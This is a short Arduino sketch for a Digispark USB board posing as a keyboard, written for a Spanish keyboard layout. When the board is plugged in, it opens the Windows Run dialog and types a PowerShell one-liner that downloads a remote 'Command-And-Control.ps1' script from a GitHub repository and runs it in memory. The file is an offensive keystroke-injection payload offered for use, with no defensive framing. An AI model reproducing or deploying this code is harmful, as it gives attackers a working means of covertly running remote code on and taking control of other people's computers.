#define kbd_es_es
#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell.exe -command \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r4mos/Digispark-Duckduino-Fileless/main/Digispark-Duckduino-Fileless/Command-And-Control.ps1')\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {

}
